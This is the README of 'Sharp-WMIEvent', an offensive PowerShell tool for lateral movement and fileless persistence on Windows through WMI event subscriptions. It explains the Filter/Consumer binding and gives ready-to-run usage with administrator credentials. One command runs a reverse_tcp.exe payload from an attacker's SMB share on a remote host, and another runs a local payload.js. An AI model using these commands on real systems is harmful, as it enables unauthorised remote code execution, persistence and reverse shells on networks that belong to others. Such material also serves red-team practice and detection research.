# Sharp-WMIEvent

## Synopsis

The script realizes intranet lateral movement and permission persistence through WMI event subscription.

## Description

WMI provides a robust event system that can be used to respond to almost any event that occurs on the operating system. For example, when a process is created, a specific action can be performed by subscribing to WMI events. Among them, the specific conditions for triggering an event are called "Event Filter", such as user login, new process creation, etc.; the response to the occurrence of a specified event is called "Event Consumer", Including a series of specific operations, such as running scripts, recording logs, sending emails, etc. When deploying event subscriptions, you need to build Filter and Consumer separately and bind them together. For details, please refer to the relevant documents provided by Microsoft.

Hackers can use the capabilities of WMI to deploy permanent event subscriptions on remote hosts and execute arbitrary code or other actions when that event occurs. ActiveScriptEventConsumer and CommandLineEventConsumer in the event consumption class are mainly used. These two Event Consumers can execute any payload on a remote host in a fileless manner. This technique is mainly used to complete permissions persistence on the target system, and can also be used for lateral movement, and requires user credentials that provide administrator permissions on the remote host. For more details, please read the relevant articles in Link by yourself.

## Usage

Execute attack payload in SMB share.

```powershell
PS C:\Users\Administrator> Import-Module .\Sharp-WMIEvent.ps1

PS C:\Users\Administrator> Sharp-WMIEvent -ConsumerType Command -ComputerName 10.10.10.19 -Domain Domain.com -Username Administrator -Password Admin@123 -Command "C:\Windows\System32\cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName Test -ConsumerName Test
[+] Creating The WMI Event Filter
[+] Creating The WMI Event Consumer
[+] Creating The WMI Event Filter And Event Consumer Binding
[+] Triggering The Target Process
[+] Cleaning Up The Event Subscriptions
```

Execute the attack payload in the local payload.js script file.

```powershell
PS C:\Users\Administrator>Import-Module .\Sharp-WMIEvent.ps1

PS C:\Users\Administrator>Sharp-WMIEvent -ConsumerType JScript -ComputerName 10.10.10.19 -Domain Domain.com -Username Administrator -Password Admin@123 -ScriptPath C:\Folder\Sharp-WMIEvent\payload.js -FilterName Test -ConsumerName Test
[+] Creating The WMI Event Filter
[+] Creating The WMI Event Consumer
[+] Creating The WMI Event Filter And Event Consumer Binding
[+] Triggering The Target Process
[+] Cleaning Up The Event Subscriptions
```

## Link

https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/

https://github.com/lengjibo/RedTeamTools/blob/master/windows/WMIShell
